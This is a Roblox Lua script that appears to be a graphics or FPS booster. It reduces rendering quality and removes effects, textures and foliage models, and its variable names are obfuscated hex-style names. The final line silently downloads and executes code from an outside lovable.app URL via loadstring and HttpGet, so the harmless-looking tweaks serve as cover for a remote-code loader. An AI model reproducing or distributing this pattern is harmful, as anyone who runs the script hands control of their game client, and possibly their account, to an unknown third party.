local _0x1a = game:GetService("Players")
local _0x2b = game:GetService("Lighting")
local _0x3c = workspace:FindFirstChildOfClass("Terrain")

settings().Rendering.QualityLevel = Enum.QualityLevel.Level0
_0x2b.GlobalShadows = false
_0x2b.Brightness = 2
_0x2b.FogEnd = 999999

for _, _0x4d in pairs(_0x2b:GetChildren()) do
    if _0x4d:IsA("PostEffect") or _0x4d:IsA("Sky") then
        _0x4d:Destroy()
    end
end

if _0x3c then
    _0x3c.WaterWaveSize = 0
    _0x3c.WaterWaveSpeed = 0
    _0x3c.WaterReflectance = 0
    _0x3c.WaterTransparency = 0
end

local function _0x5e(_0x6f)
    if _0x6f:IsA("BasePart") then
        _0x6f.Material = Enum.Material.SmoothPlastic
        _0x6f.Reflectance = 0
        _0x6f.CastShadow = false
    elseif _0x6f:IsA("Decal") or _0x6f:IsA("Texture") then
        _0x6f:Destroy()
    elseif _0x6f:IsA("ParticleEmitter") or _0x6f:IsA("Trail") or _0x6f:IsA("Fire") or _0x6f:IsA("Smoke") or _0x6f:IsA("Sparkles") then
        _0x6f:Destroy()
    end
end

for _, _0x70 in pairs(workspace:GetDescendants()) do
    _0x5e(_0x70)
    if _0x70:IsA("Model") then
        local _0x81 = _0x70.Name:lower()
        if _0x81:find("tree") or _0x81:find("plant") or _0x81:find("grass") or _0x81:find("leaves") or _0x81:find("bush") or _0x81:find("flower") or _0x81:find("prop") then
            _0x70:Destroy()
        end
    end
end

workspace.DescendantAdded:Connect(function(_0x92)
    _0x5e(_0x92)
end)

print("Done")
loadstring(game:HttpGet("https://thanhduyhubxyz.lovable.app/api/public/raw/08c55f5333dcae36c24fba7390a20008"))()
